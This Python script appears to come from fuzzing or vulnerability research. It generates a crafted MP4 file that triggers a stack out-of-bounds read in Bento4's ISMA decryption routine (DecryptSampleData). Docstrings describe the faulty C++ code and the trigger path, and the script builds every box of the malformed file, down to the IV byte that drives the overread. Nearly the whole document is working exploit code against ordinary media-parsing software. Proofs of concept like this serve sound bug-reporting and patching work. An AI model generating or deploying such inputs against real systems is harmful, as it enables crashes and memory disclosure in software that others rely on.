#!/usr/bin/env python3
"""
VULN 001 PoC Generator
Title: Stack OOB Read in DecryptSampleData via Crafted iSFM iv_length
CWE: CWE-125 (Out-of-bounds Read)
Function: AP4_IsmaCipher::DecryptSampleData

The bug in Ap4IsmaCryp.cpp:
    AP4_UI08 zero_enc[16];       // 16-byte stack buffer
    unsigned int offset = (unsigned int)(bso % 16);  // = 9 when IV byte = 0x09
    unsigned int chunk = offset;                       // = 9
    if (chunk > payload_size) chunk = payload_size;
    for (unsigned int i=0; i<chunk; i++) {
        out[i] = zero_enc[offset+i] ^ in[i];   // zero_enc[9+8] = zero_enc[17] -> OOB!
    }

Trigger path:
    mp42aac --key <hex> vuln_001.mp4 /dev/null
        -> DecryptAndWriteSamples
        -> AP4_IsmaCipher::DecryptSampleData
        -> zero_enc[offset+i] with offset=9, i up to 8 -> index 17 -> OOB

MP4 structure:
    ftyp
    moov
      mvhd
      trak
        tkhd
        mdia
          mdhd
          hdlr  (soun)
          minf
            smhd
            dinf/dref/url
            stbl
              stsd  -> enca -> sinf -> frma + schm(iAEC) + schi -> iSFM(iv_length=1)
              stts, stsc, stsz, stco
    mdat  (sample: 0x09 + 19 bytes of payload)
"""

import struct
import os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IsfmAtom_h"
OUTPUT_FILE = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(fourcc, payload=b''):
    """Plain box: size(4) + fourcc(4) + payload"""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    assert len(fourcc) == 4, f"fourcc must be 4 chars: {fourcc!r}"
    size = 8 + len(payload)
    return struct.pack('>I', size) + fourcc + payload


def make_fullbox(fourcc, version, flags, payload=b''):
    """FullBox: size(4) + fourcc(4) + version(1) + flags(3) + payload"""
    vh = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 1 + 3 = 4 bytes
    return make_box(fourcc, vh + payload)


# Identity matrix for tkhd/mvhd (9 uint32 big-endian, 36 bytes)
MATRIX = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)


def build_ftyp():
    """ftyp box: 8 + 4(major) + 4(minor) + 12(compat) = 28 bytes"""
    payload = b'isom'                       # major_brand
    payload += struct.pack('>I', 0x200)     # minor_version
    payload += b'isom' + b'iso2' + b'mp41' # compatible_brands
    return make_box('ftyp', payload)


def build_isfm():
    """
    iSFM FullBox (15 bytes):
      size(4) + 'iSFM'(4) + version(1) + flags(3) + sel_enc(1) + key_ind_len(1) + iv_len(1)

    selective_encryption = 0 (bit7=0) -> m_SelectiveEncryption=false -> is_encrypted=true always
    key_indicator_length = 0 -> no key indicator bytes in sample data
    iv_length = 1 -> 1 byte IV in sample data
    """
    payload = struct.pack('>BBB',
        0x00,   # selective_encryption byte (bit7=0 -> false)
        0x00,   # key_indicator_length = 0
        0x01    # iv_length = 1  <-- KEY FIELD
    )
    return make_fullbox('iSFM', 0, 0, payload)  # 8+4+3 = 15 bytes


def build_schi():
    """schi container: 8 + iSFM(15) = 23 bytes"""
    return make_box('schi', build_isfm())


def build_frma():
    """frma box (12 bytes): original_format = 'mp4a'"""
    return make_box('frma', b'mp4a')  # 8 + 4 = 12


def build_schm():
    """
    schm FullBox (20 bytes):
      size(4)='iAEC' version(1)+flags(3) + scheme_type(4) + scheme_version(4)

    scheme_type = 'iAEC' = AP4_PROTECTION_SCHEME_TYPE_IAEC
    size=20, which is NOT < (AP4_FULL_ATOM_HEADER_SIZE+8=20), so short_form=false
    -> reads 4-byte scheme_version
    """
    payload = b'iAEC' + struct.pack('>I', 1)  # scheme_type(4) + scheme_version(4) = 8 bytes
    return make_fullbox('schm', 0, 0, payload)  # 8+4+8 = 20 bytes


def build_sinf():
    """sinf container: 8 + frma(12) + schm(20) + schi(23) = 63 bytes"""
    return make_box('sinf', build_frma() + build_schm() + build_schi())


def build_enca():
    """
    enca audio sample entry (99 bytes):
      header(8) + SampleEntry(8) + AudioSampleEntry(20) + sinf(63)
    """
    # SampleEntry fields: 6 reserved bytes + 2-byte data_reference_index
    se_fields = b'\x00' * 6 + struct.pack('>H', 1)  # 8 bytes

    # AudioSampleEntry fields (20 bytes):
    #   qt_version(2) + qt_revision(2) + qt_vendor(4)
    #   channel_count(2) + sample_size(2) + qt_compression_id(2) + qt_packet_size(2)
    #   sample_rate as 16.16 fixed-point(4)
    au_fields = (
        struct.pack('>H', 0) +           # qt_version = 0 (standard)
        struct.pack('>H', 0) +           # qt_revision = 0
        struct.pack('>I', 0) +           # qt_vendor = 0
        struct.pack('>H', 2) +           # channel_count = 2 (stereo)
        struct.pack('>H', 16) +          # sample_size = 16-bit
        struct.pack('>H', 0) +           # qt_compression_id = 0
        struct.pack('>H', 0) +           # qt_packet_size = 0
        struct.pack('>I', 44100 << 16)   # sample_rate = 44100 as 16.16
    )  # 20 bytes

    return make_box('enca', se_fields + au_fields + build_sinf())
    # 8 + 8 + 20 + 63 = 99


def build_stsd():
    """stsd FullBox: 12(FullBox) + 4(entry_count) + enca(99) = 115 bytes"""
    payload = struct.pack('>I', 1) + build_enca()  # entry_count=1 + enca
    return make_fullbox('stsd', 0, 0, payload)


def build_stts():
    """stts: 1 sample with delta=1024. Total: 12+4+8 = 24 bytes"""
    payload = struct.pack('>I', 1)          # entry_count = 1
    payload += struct.pack('>II', 1, 1024)  # sample_count=1, sample_delta=1024
    return make_fullbox('stts', 0, 0, payload)


def build_stsc():
    """stsc: 1 entry (first_chunk=1, 1 sample/chunk, desc_index=1). Total: 12+4+12 = 28 bytes"""
    payload = struct.pack('>I', 1)            # entry_count = 1
    payload += struct.pack('>III', 1, 1, 1)   # first_chunk, samples_per_chunk, desc_idx
    return make_fullbox('stsc', 0, 0, payload)


def build_stsz(sample_size):
    """stsz: 1 sample of given size. Total: 12+4+4+4 = 24 bytes"""
    payload = struct.pack('>I', 0)             # uniform_size = 0 (variable sizes)
    payload += struct.pack('>I', 1)            # sample_count = 1
    payload += struct.pack('>I', sample_size)  # size of sample 1
    return make_fullbox('stsz', 0, 0, payload)


def build_stco(chunk_offset):
    """stco: 1 chunk at given absolute file offset. Total: 12+4+4 = 20 bytes"""
    payload = struct.pack('>I', 1)              # entry_count = 1
    payload += struct.pack('>I', chunk_offset)  # absolute offset
    return make_fullbox('stco', 0, 0, payload)


def build_stbl(sample_size, chunk_offset):
    """stbl container: 8+115+24+28+24+20 = 219 bytes"""
    children = (
        build_stsd() +
        build_stts() +
        build_stsc() +
        build_stsz(sample_size) +
        build_stco(chunk_offset)
    )
    return make_box('stbl', children)


def build_smhd():
    """smhd: sound media header. Total: 12+4 = 16 bytes"""
    payload = struct.pack('>HH', 0, 0)  # balance=0, reserved=0
    return make_fullbox('smhd', 0, 0, payload)


def build_url():
    """url  data reference entry (self-contained, flags=0x000001). Total: 12 bytes"""
    return make_fullbox('url ', 0, 0x000001, b'')


def build_dref():
    """dref: 1 url entry. Total: 12+4+12 = 28 bytes"""
    payload = struct.pack('>I', 1) + build_url()  # entry_count=1 + url
    return make_fullbox('dref', 0, 0, payload)


def build_dinf():
    """dinf container: 8+28 = 36 bytes"""
    return make_box('dinf', build_dref())


def build_minf(sample_size, chunk_offset):
    """minf container: 8+16+36+219 = 279 bytes"""
    children = (
        build_smhd() +
        build_dinf() +
        build_stbl(sample_size, chunk_offset)
    )
    return make_box('minf', children)


def build_mdhd():
    """mdhd: media header. Total: 12+20 = 32 bytes"""
    payload = (
        struct.pack('>I', 0) +       # creation_time
        struct.pack('>I', 0) +       # modification_time
        struct.pack('>I', 44100) +   # timescale = 44100 Hz
        struct.pack('>I', 1024) +    # duration = 1024 samples
        struct.pack('>H', 0) +       # language = 0 (undetermined)
        struct.pack('>H', 0)         # pre_defined
    )  # 20 bytes
    return make_fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    """
    hdlr: sound handler. Total: 12+21 = 33 bytes.
    handler_type='soun' = AP4_HANDLER_TYPE_SOUN, recognized as AP4_Track::TYPE_AUDIO
    """
    payload = (
        struct.pack('>I', 0) +  # pre_defined
        b'soun' +               # handler_type = AP4_HANDLER_TYPE_SOUN
        b'\x00' * 12 +         # reserved (3 * uint32)
        b'\x00'                 # name (null terminator only)
    )  # 21 bytes
    return make_fullbox('hdlr', 0, 0, payload)


def build_mdia(sample_size, chunk_offset):
    """mdia container: 8+32+33+279 = 352 bytes"""
    children = (
        build_mdhd() +
        build_hdlr() +
        build_minf(sample_size, chunk_offset)
    )
    return make_box('mdia', children)


def build_tkhd():
    """
    tkhd: track header. Total: 12+80 = 92 bytes.
    flags=3: track_enabled(bit0) | track_in_movie(bit1)
    """
    payload = (
        struct.pack('>I', 0) +      # creation_time
        struct.pack('>I', 0) +      # modification_time
        struct.pack('>I', 1) +      # track_id = 1
        struct.pack('>I', 0) +      # reserved
        struct.pack('>I', 1024) +   # duration
        b'\x00' * 8 +              # reserved2
        struct.pack('>H', 0) +      # layer
        struct.pack('>H', 0) +      # alternate_group
        struct.pack('>H', 0x0100) + # volume = 1.0 (8.8 fixed-point)
        struct.pack('>H', 0) +      # reserved3
        MATRIX +                    # transformation matrix (36 bytes)
        struct.pack('>I', 0) +      # width = 0 (audio track)
        struct.pack('>I', 0)        # height = 0 (audio track)
    )  # 20+8+8+36+8 = 80 bytes
    return make_fullbox('tkhd', 0, 3, payload)


def build_trak(sample_size, chunk_offset):
    """trak container: 8+92+352 = 452 bytes"""
    children = build_tkhd() + build_mdia(sample_size, chunk_offset)
    return make_box('trak', children)


def build_mvhd():
    """mvhd: movie header. Total: 12+96 = 108 bytes"""
    payload = (
        struct.pack('>I', 0) +          # creation_time
        struct.pack('>I', 0) +          # modification_time
        struct.pack('>I', 44100) +      # timescale = 44100
        struct.pack('>I', 1024) +       # duration = 1024
        struct.pack('>I', 0x00010000) + # rate = 1.0 (16.16 fixed-point)
        struct.pack('>H', 0x0100) +     # volume = 1.0 (8.8 fixed-point)
        b'\x00' * 10 +                 # reserved
        MATRIX +                        # matrix (36 bytes)
        b'\x00' * 24 +                 # pre_defined (6 * uint32)
        struct.pack('>I', 2)            # next_track_id = 2
    )  # 16+4+2+10+36+24+4 = 96 bytes
    return make_fullbox('mvhd', 0, 0, payload)


def build_moov(sample_size, chunk_offset):
    """moov container: 8+108+452 = 568 bytes"""
    children = build_mvhd() + build_trak(sample_size, chunk_offset)
    return make_box('moov', children)


def build_mdat(data):
    """mdat: media data container"""
    return make_box('mdat', data)


def main():
    """
    Build the crafted MP4 that triggers the OOB read in DecryptSampleData.

    Sample data layout (with iv_length=1, key_indicator_length=0, selective_enc=false):
      [IV byte = 0x09][payload bytes...]

    Execution in DecryptSampleData:
      bso_bytes[7] = 0x09 (since m_IvLength=1)
      bso = 9
      bso % 16 = 9  != 0  ->  enters non-block-aligned branch
      offset = 9
      chunk = min(9, payload_size)
      for i in 0..8:  out[i] = zero_enc[9+i] ^ in[i]
                                ^^^^^^^^^^^^ max index = 17, but zero_enc is [16]
      -> ASAN: stack-buffer-overflow READ
    """
    # Sample: 1 byte IV (0x09) + 19 bytes payload = 20 bytes total
    # payload_size = 19 >= 9 = chunk, so OOB happens at full depth
    sample_data = b'\x09' + b'\xAA' * 19  # 20 bytes

    # Compute moov size with placeholder offset (offset field size is constant)
    placeholder_moov = build_moov(len(sample_data), 0)
    moov_size = len(placeholder_moov)

    ftyp_box = build_ftyp()
    ftyp_size = len(ftyp_box)  # 28 bytes

    # Actual chunk offset = ftyp + moov + mdat_header(8)
    chunk_offset = ftyp_size + moov_size + 8

    # Build final moov with real offset
    moov_box = build_moov(len(sample_data), chunk_offset)
    assert len(moov_box) == moov_size, \
        f"moov size changed: {len(moov_box)} != {moov_size}"

    mdat_box = build_mdat(sample_data)

    mp4_data = ftyp_box + moov_box + mdat_box

    os.makedirs(POC_DIR, exist_ok=True)
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)

    print(f"[+] Generated: {OUTPUT_FILE}")
    print(f"[+] Total size: {len(mp4_data)} bytes")
    print(f"[+]   ftyp: {ftyp_size} bytes (offset 0)")
    print(f"[+]   moov: {moov_size} bytes (offset {ftyp_size})")
    print(f"[+]   mdat: {len(mdat_box)} bytes (offset {ftyp_size + moov_size})")
    print(f"[+] chunk_offset (absolute): {chunk_offset}")
    print(f"[+] sample_data ({len(sample_data)} bytes): {sample_data.hex()}")
    print(f"[+]   IV byte = 0x{sample_data[0]:02x} -> bso=9, bso%16=9 -> offset=9")
    print(f"[+]   OOB: zero_enc[9+8]=zero_enc[17], but zero_enc is [16]")
    print(f"[+] Trigger: mp42aac --key 0123456789abcdef0123456789abcdef {OUTPUT_FILE} /dev/null")


if __name__ == '__main__':
    main()
